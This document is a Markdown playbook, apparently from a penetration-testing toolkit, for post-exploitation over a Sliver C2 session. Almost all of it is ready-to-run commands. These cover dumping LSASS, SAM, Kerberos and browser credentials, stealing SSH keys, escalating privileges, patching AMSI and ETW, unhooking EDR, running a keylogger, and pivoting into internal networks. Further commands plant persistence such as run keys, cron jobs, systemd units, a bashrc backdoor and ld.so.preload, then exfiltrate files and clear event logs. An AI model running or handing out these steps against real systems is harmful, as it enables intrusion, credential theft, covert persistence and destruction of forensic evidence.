# C2 Post-Exploitation — Sliver Session Operations

## Overview

Use an established Sliver C2 session for comprehensive post-exploitation:
credential dumping, privilege escalation, lateral movement, data collection,
persistence, pivoting, screenshot/keylogging, and BOF execution. All operations
route through the C2 channel for stealth.

## Workflow

```
Get Session → Situational Awareness → Privilege Check
├── Unprivileged → Privesc → Continue as privileged
└── Privileged → Credential Dump → Lateral Movement → Persistence → Pivot
```

## Phase 1: Session Interaction

### Connect to Session

```bash
# List available sessions
sliver > sessions

# Interact with a session
sliver > use <SESSION_ID>

# For beacons
sliver > beacons
sliver > use <BEACON_ID>

# Get session info
sliver [session] > info
```

### Session Management Commands

```bash
# Rename session for tracking
sliver [session] > rename -n "dc01-system"

# Background current session
sliver [session] > background

# Kill a session (cleanup)
sliver > sessions kill <SESSION_ID>

# Kill a beacon
sliver > beacons kill <BEACON_ID>
```

## Phase 2: Situational Awareness (ALWAYS DO FIRST)

```bash
# System info
sliver [session] > info
sliver [session] > whoami
sliver [session] > getuid
sliver [session] > getpid

# Process enumeration (find AV, find migration targets)
sliver [session] > ps

# Network enumeration
sliver [session] > ifconfig
sliver [session] > netstat

# Environment variables (may contain creds/tokens)
sliver [session] > env

# File system exploration
sliver [session] > ls /
sliver [session] > ls C:\\Users
sliver [session] > pwd

# Check current privileges
sliver [session] > getprivs  # Windows
sliver [session] > execute -o id  # Linux
```

### Automated Enum (Helper Script)

```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action enum \
  --output-dir /pentest/output/$JOB_ID --json
```

## Phase 3: Credential Harvesting

### Windows Credential Dumping

```bash
# SAM hash dump (requires SYSTEM)
sliver [session] > hashdump

# Dump LSASS via built-in command
sliver [session] > execute -o "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"

# Dump LSASS via BOF (stealthier — no file drop)
sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o --write C:\\Windows\\Temp\\debug.dmp
sliver [session] > download C:\\Windows\\Temp\\debug.dmp /tmp/lsass.dmp

# Extract cached credentials
sliver [session] > inline-execute /opt/tools/bofs/cached_creds.x64.o

# Dump LSA secrets
sliver [session] > inline-execute /opt/tools/bofs/lsa_secrets.x64.o

# Kerberos ticket extraction
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- triage
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- dump

# DPAPI credential extraction
sliver [session] > execute-assembly /opt/tools/SharpDPAPI.exe -- triage

# WiFi password extraction
sliver [session] > execute-assembly /opt/tools/SharpWiFi.exe

# Browser credential extraction
sliver [session] > execute-assembly /opt/tools/SharpChromium.exe -- logins
```

### Linux Credential Harvesting

```bash
# Read shadow file (requires root)
sliver [session] > cat /etc/shadow

# Read SSH keys
sliver [session] > download /root/.ssh/id_rsa /tmp/stolen_key
sliver [session] > download /home/*/.ssh/id_rsa /tmp/

# Read web app configs (database credentials)
sliver [session] > cat /var/www/html/wp-config.php
sliver [session] > cat /var/www/html/.env
sliver [session] > cat /opt/*/config/database.yml

# Bash history (may contain passwords)
sliver [session] > cat /root/.bash_history
sliver [session] > cat /home/*/.bash_history

# Check for stored credentials
sliver [session] > execute -o "find / -name '*.conf' -o -name '*.cfg' -o -name '.env' 2>/dev/null | head -50"

# Dump /proc for credential artifacts
sliver [session] > execute -o "strings /proc/*/environ 2>/dev/null | grep -iE 'pass|key|token|secret' | head -20"
```

### Helper Script (Automated)

```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action hashdump \
  --output-dir /pentest/output/$JOB_ID --json
```

## Phase 4: Privilege Escalation

### Windows Privesc

```bash
# Check current privileges
sliver [session] > getprivs

# Named pipe impersonation (get SYSTEM)
sliver [session] > getsystem

# Token impersonation
sliver [session] > impersonate <USERNAME>

# Token stealing from process
sliver [session] > steal-token <PID>

# Run privesc enumeration BOF
sliver [session] > inline-execute /opt/tools/bofs/winpeas.x64.o

# SharpUp enumeration
sliver [session] > execute-assembly /opt/tools/SharpUp.exe -- audit

# Check for vulnerable services
sliver [session] > execute-assembly /opt/tools/Seatbelt.exe -- -group=all

# Potato attacks (if SeImpersonatePrivilege)
sliver [session] > upload /opt/tools/GodPotato.exe C:\\Windows\\Temp\\
sliver [session] > execute -o "C:\\Windows\\Temp\\GodPotato.exe -cmd 'whoami'"
```

### Linux Privesc

```bash
# Check sudo permissions
sliver [session] > execute -o "sudo -l"

# Find SUID binaries
sliver [session] > execute -o "find / -perm -4000 -type f 2>/dev/null"

# Check capabilities
sliver [session] > execute -o "getcap -r / 2>/dev/null"

# Check cron jobs
sliver [session] > cat /etc/crontab
sliver [session] > execute -o "ls -la /etc/cron.d/"

# Check writable scripts in PATH
sliver [session] > execute -o "find /usr/local/bin /usr/bin -writable 2>/dev/null"

# Kernel version (check for kernel exploits)
sliver [session] > execute -o "uname -a"

# Upload and run linpeas
sliver [session] > upload /opt/tools/linpeas.sh /tmp/linpeas.sh
sliver [session] > execute -o "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh -a"
```

### Helper Script (Automated)

```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action privesc --json
```

## Phase 5: BOF Execution (Beacon Object Files)

BOFs execute in-process — no file drop, no new process, minimal forensic footprint.

### Built-in Sliver BOF Support

```bash
# Load and execute a BOF
sliver [session] > inline-execute /path/to/bof.x64.o [args...]

# Load a .NET assembly in-memory
sliver [session] > execute-assembly /path/to/assembly.exe [args...]

# Run a sideloaded DLL
sliver [session] > sideload /path/to/library.dll [entrypoint] [args...]
```

### Essential BOF Arsenal

```bash
# --- Enumeration BOFs ---
# ADSearch — LDAP enumeration
sliver [session] > execute-assembly /opt/tools/ADSearch.exe -- --search "(objectClass=user)"

# SharpHound — AD graph collection
sliver [session] > execute-assembly /opt/tools/SharpHound.exe -- -c All

# Seatbelt — Host enumeration
sliver [session] > execute-assembly /opt/tools/Seatbelt.exe -- -group=all

# --- Credential BOFs ---
# Rubeus — Kerberos operations
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- kerberoast /outfile:hashes.txt
sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- asreproast /outfile:asrep.txt

# Nanodump — LSASS dumper (stealthy)
sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o

# --- Lateral Movement BOFs ---
# SCShell — Fileless lateral movement via service manager
sliver [session] > inline-execute /opt/tools/bofs/scshell.x64.o TARGET_IP svchost cmd.exe

# WMI execution
sliver [session] > inline-execute /opt/tools/bofs/wmi_exec.x64.o TARGET_IP "cmd /c whoami"

# --- Evasion BOFs ---
# AMSI patch
sliver [session] > inline-execute /opt/tools/bofs/amsi_patch.x64.o

# ETW patch
sliver [session] > inline-execute /opt/tools/bofs/etw_patch.x64.o

# Unhook ntdll (remove EDR hooks)
sliver [session] > inline-execute /opt/tools/bofs/unhook_ntdll.x64.o
```

## Phase 6: Screenshot & Keylogging

```bash
# Take screenshot
sliver [session] > screenshot
# Save screenshot to file
sliver [session] > screenshot -s /pentest/output/screenshot.png

# Start keylogger (session-based — requires active session, not beacon)
# Note: Sliver doesn't have a built-in keylogger; use BOF or upload tool
sliver [session] > upload /opt/tools/keylogger.exe C:\\Windows\\Temp\\
sliver [session] > execute -o "C:\\Windows\\Temp\\keylogger.exe --duration 60 --output C:\\Windows\\Temp\\keys.txt"
sliver [session] > download C:\\Windows\\Temp\\keys.txt /pentest/output/
```

### Helper Script

```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action screenshot \
  --output-dir /pentest/output/$JOB_ID --json
```

## Phase 7: Pivoting & Port Forwarding

### Sliver Built-in Pivoting

```bash
# Port forwarding: access internal service through C2 session
sliver [session] > portfwd add --remote <INTERNAL_HOST>:<PORT> --bind 127.0.0.1:<LOCAL_PORT>

# Example: Pivot to internal SMB
sliver [session] > portfwd add --remote 10.0.0.5:445 --bind 127.0.0.1:8445

# Then from Kali:
crackmapexec smb 127.0.0.1 --port 8445 -u admin -p password

# List active port forwards
sliver [session] > portfwd list

# Remove a port forward
sliver [session] > portfwd rm --id <FORWARD_ID>
```

### SOCKS Proxy (Full Network Pivot)

```bash
# Start SOCKS5 proxy through session
sliver [session] > socks5 start --port 1080

# Configure proxychains on Kali
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use proxychains to scan/exploit internal network
proxychains nmap -sT -Pn -n 10.0.0.0/24 -p 22,80,445,3389
proxychains crackmapexec smb 10.0.0.5 -u admin -p password
proxychains evil-winrm -i 10.0.0.5 -u admin -p password

# Stop SOCKS proxy
sliver [session] > socks5 stop --id <PROXY_ID>
```

### Reverse Port Forward (Tunnel Inbound)

```bash
# Expose a Kali service to the target's internal network
sliver [session] > rportfwd add --remote 0.0.0.0:8080 --bind 127.0.0.1:80
# Now internal hosts can reach Kali's port 80 via compromised host:8080
```

### Named Pipe Pivot (Windows → Windows lateral)

```bash
# Start a named pipe listener on the compromised host
sliver > pivots tcp --bind 0.0.0.0:9898 --session <SESSION_ID>

# Generate implant that connects through the pivot
sliver > generate --tcp-pivot <COMPROMISED_IP>:9898 --os windows --arch amd64 \
  --save /tmp/pivot_implant.exe
```

### Helper Script

```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \
  --session-id <SESSION_ID> --action portfwd \
  --remote-host 10.0.0.5 --remote-port 445 --local-port 8445 --json
```

## Phase 8: Persistence Mechanisms

### Windows Persistence

```bash
# Registry run key
sliver [session] > execute -o 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\svc.exe" /f'

# Scheduled task
sliver [session] > execute -o 'schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\svc.exe" /sc onlogon /ru SYSTEM /f'

# WMI event subscription
sliver [session] > execute-assembly /opt/tools/SharpPersist.exe -- -t schtask -c "C:\Windows\Temp\svc.exe" -n "UpdateCheck" -m add

# Service creation (requires admin)
sliver [session] > execute -o 'sc create WindowsUpdateSvc binPath= "C:\Windows\Temp\svc.exe" start= auto'
sliver [session] > execute -o 'sc start WindowsUpdateSvc'

# DLL hijacking (search order hijacking)
# Find writable DLL search paths for a target service
sliver [session] > execute-assembly /opt/tools/SharpDLLProxy.exe -- --target "C:\Program Files\VulnApp\app.exe"
```

### Linux Persistence

```bash
# Cron job
sliver [session] > execute -o 'echo "*/5 * * * * /tmp/.cache >/dev/null 2>&1" | crontab -'

# Systemd service
sliver [session] > execute -o 'cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.cache
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF'
sliver [session] > execute -o 'systemctl daemon-reload && systemctl enable --now update.service'

# SSH authorized_keys (if you have root)
sliver [session] > execute -o 'mkdir -p /root/.ssh && echo "YOUR_PUB_KEY" >> /root/.ssh/authorized_keys'

# Bashrc backdoor (user-level)
sliver [session] > execute -o 'echo "nohup /tmp/.cache >/dev/null 2>&1 &" >> /home/user/.bashrc'

# LD_PRELOAD hijack
sliver [session] > upload /tmp/malicious.so /usr/lib/libupdate.so
sliver [session] > execute -o 'echo "/usr/lib/libupdate.so" >> /etc/ld.so.preload'
```

### Sliver Beacon Persistence (Built-in)

```bash
# Generate a beacon with reconnect resilience
sliver > generate beacon --mtls <KALI_IP>:8888 --os windows --arch amd64 \
  --seconds 60 --jitter 30 \
  --reconnect 300 \
  --max-errors 1000 \
  --save /tmp/persistent_beacon.exe
```

## Phase 9: Data Collection & Exfiltration

```bash
# Download files
sliver [session] > download C:\\Users\\admin\\Desktop\\secrets.docx /tmp/loot/
sliver [session] > download /etc/shadow /tmp/loot/

# Upload tools
sliver [session] > upload /opt/tools/mimikatz.exe C:\\Windows\\Temp\\

# Recursive directory download
sliver [session] > download C:\\Users\\admin\\Documents /tmp/loot/docs/

# Find and exfiltrate sensitive files
sliver [session] > execute -o "dir /s /b C:\\Users\\*.kdbx C:\\Users\\*.key C:\\Users\\*.pem 2>nul"
sliver [session] > execute -o "find /home -name '*.pem' -o -name '*.key' -o -name '*.kdbx' 2>/dev/null"
```

## Phase 10: Cleanup

```bash
# Kill session implant
sliver [session] > kill

# Remove uploaded files
sliver [session] > execute -o "del C:\\Windows\\Temp\\svc.exe"
sliver [session] > execute -o "rm -f /tmp/.cache"

# Remove persistence
sliver [session] > execute -o 'schtasks /delete /tn "WindowsUpdate" /f'
sliver [session] > execute -o 'reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f'
sliver [session] > execute -o 'crontab -r'

# Remove port forwards
sliver [session] > portfwd rm --id all

# Clean event logs (if authorized)
sliver [session] > execute -o "wevtutil cl Security"
sliver [session] > execute -o "wevtutil cl System"
```

## Post-Exploitation Command Quick Reference

| Action | Sliver Command | Requires |
|--------|---------------|----------|
| System info | `info` | Any |
| Process list | `ps` | Any |
| Hash dump | `hashdump` | SYSTEM/root |
| Screenshot | `screenshot` | Session (not beacon) |
| Port forward | `portfwd add -r host:port -b 0.0.0.0:lport` | Any |
| SOCKS proxy | `socks5 start` | Any |
| File download | `download /path` | Any |
| File upload | `upload local remote` | Any |
| Get SYSTEM | `getsystem` | Admin |
| Token steal | `steal-token PID` | Admin |
| Impersonate | `impersonate USER` | Admin |
| Migrate | `migrate PID` | Admin |
| Execute .NET | `execute-assembly /path/to.exe args` | Any |
| Execute BOF | `inline-execute /path/to.o args` | Any |
| Sideload DLL | `sideload /path/to.dll` | Any |
| Shell command | `execute -o "command"` | Any |
| Interactive shell | `shell` | Any |

## Evidence Collection

- Enumeration results (whoami, ifconfig, ps, netstat)
- Credential dumps (hashes, tickets, tokens, keys)
- Screenshots with timestamps
- Pivot/tunnel configurations
- Lateral movement proof (whoami on new hosts)
- Persistence mechanism details
- All downloaded files with checksums
